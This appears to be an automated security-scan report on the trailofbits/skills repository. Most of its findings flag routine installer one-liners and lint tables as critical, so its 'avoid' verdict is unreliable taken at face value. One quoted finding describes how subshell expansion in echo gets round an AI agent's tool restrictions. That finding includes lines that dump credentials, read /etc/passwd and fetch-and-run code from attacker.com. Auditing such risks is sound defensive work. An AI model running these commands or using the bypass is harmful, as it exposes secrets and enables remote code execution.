# trailofbits-skills audit

- Repository: trailofbits/skills
- URL: https://github.com/trailofbits/skills
- Risk level: **critical**
- Recommendation: **avoid**
- Findings: 2483

## Security summary
- Overall risk assessed as CRITICAL based on static repository inspection.
- Repository contains outbound network request patterns that should be reviewed.
- Repository can write, modify, or delete local files.
- Repository invokes shell / subprocess style execution paths.
- Repository references credential-like or sensitive filesystem locations.

## Findings
### [critical] Remote code execution pattern detected
- Path: `.github/workflows/lint.yml`:40
- Category: remote-code
- Evidence: `curl -LsSf https://astral.sh/uv/install.sh | sh`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `plugins/agentic-actions-auditor/skills/agentic-actions-auditor/references/vector-f-subshell-expansion.md`:51
- Category: remote-code
- Evidence: `Tool restrictions give a false sense of security. "Only allow echo" sounds safe -- echo just prints text. But \`echo $(env)\` dumps all environment variables including \`GITHUB_TOKEN\`, API keys, and deployment credentials. \`echo $(cat /etc/passwd)\` reads system files. \`echo $(curl attacker.com/payload | sh)\` downloads and executes arbitrary code. The restriction controls which command NAME the AI can invoke, but it does not prevent the shell from interpreting everything inside \`$()\` before that com`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `plugins/devcontainer-setup/skills/devcontainer-setup/references/dockerfile-best-practices.md`:54
- Category: remote-code
- Evidence: `RUN set -o pipefail && curl -fsSL https://example.com/install.sh | bash`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `plugins/devcontainer-setup/skills/devcontainer-setup/resources/Dockerfile`:77
- Category: remote-code
- Evidence: `RUN curl -fsSL https://claude.ai/install.sh | bash && \`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `plugins/devcontainer-setup/skills/devcontainer-setup/resources/Dockerfile`:91
- Category: remote-code
- Evidence: `RUN curl -fsSL https://fnm.vercel.app/install | bash -s -- --install-dir "$FNM_DIR" --skip-shell && \`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `plugins/modern-python/skills/modern-python/references/security-setup.md`:19
- Category: remote-code
- Evidence: `curl --proto '=https' --tlsv1.2 -LsSf https://github.com/j178/prek/releases/latest/download/prek-installer.sh | sh`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `plugins/modern-python/skills/modern-python/references/uv-commands.md`:11
- Category: remote-code
- Evidence: `curl -LsSf https://astral.sh/uv/install.sh | sh`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [critical] Remote code execution pattern detected
- Path: `plugins/testing-handbook-skills/skills/libafl/SKILL.md`:84
- Category: remote-code
- Evidence: `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`
- Description: Pipeline-style remote fetch and execution pattern detected.

### [high] Shell or dynamic execution detected
- Path: `plugins/agentic-actions-auditor/skills/agentic-actions-auditor/references/vector-g-eval-of-ai-output.md`:36
- Category: execution
- Evidence: `- Python \`exec()\` or \`subprocess\` with string formatting from AI output`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/agentic-actions-auditor/skills/agentic-actions-auditor/references/vector-g-eval-of-ai-output.md`:36
- Category: obfuscation
- Evidence: `- Python \`exec()\` or \`subprocess\` with string formatting from AI output`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Shell or dynamic execution detected
- Path: `plugins/agentic-actions-auditor/skills/agentic-actions-auditor/references/vector-g-eval-of-ai-output.md`:39
- Category: execution
- Evidence: `3. **Python/Node steps** that use \`json.loads()\` on AI output and then format values into a shell command (string interpolation into \`subprocess.run()\` or \`os.system()\`)`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Shell or dynamic execution detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:148
- Category: execution
- Evidence: `"eval": "eval() has unpredictable timing characteristics",`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:148
- Category: obfuscation
- Evidence: `"eval": "eval() has unpredictable timing characteristics",`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:167
- Category: obfuscation
- Evidence: `"atob": "atob() timing may vary based on input length",`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Shell or dynamic execution detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:218
- Category: execution
- Evidence: `"eval": "eval() has unpredictable timing characteristics",`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:218
- Category: obfuscation
- Evidence: `"eval": "eval() has unpredictable timing characteristics",`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Shell or dynamic execution detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:219
- Category: execution
- Evidence: `"exec": "exec() has unpredictable timing characteristics",`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:219
- Category: obfuscation
- Evidence: `"exec": "exec() has unpredictable timing characteristics",`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/ct_analyzer/script_analyzers.py`:238
- Category: obfuscation
- Evidence: `"base64.b64decode": "base64.b64decode() timing may vary based on input length",`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Shell or dynamic execution detected
- Path: `plugins/constant-time-analysis/skills/constant-time-analysis/references/javascript.md`:47
- Category: execution
- Evidence: `| \`eval()\` | Unpredictable timing | Avoid entirely |`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/skills/constant-time-analysis/references/javascript.md`:47
- Category: obfuscation
- Evidence: `| \`eval()\` | Unpredictable timing | Avoid entirely |`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/skills/constant-time-analysis/references/javascript.md`:60
- Category: obfuscation
- Evidence: `| \`btoa()\` / \`atob()\` | Variable-length output | Fixed-length padding |`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Shell or dynamic execution detected
- Path: `plugins/constant-time-analysis/skills/constant-time-analysis/references/python.md`:63
- Category: execution
- Evidence: `| \`eval()\` | Unpredictable timing | Avoid entirely |`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.

### [high] Obfuscation or dynamic payload decoding detected
- Path: `plugins/constant-time-analysis/skills/constant-time-analysis/references/python.md`:63
- Category: obfuscation
- Evidence: `| \`eval()\` | Unpredictable timing | Avoid entirely |`
- Description: Code uses decoding / compression / dynamic execution patterns often used to hide logic.

### [high] Shell or dynamic execution detected
- Path: `plugins/constant-time-analysis/skills/constant-time-analysis/references/python.md`:64
- Category: execution
- Evidence: `| \`exec()\` | Unpredictable timing | Avoid entirely |`
- Description: Code invokes subprocesses, shell commands, or dynamic execution APIs.
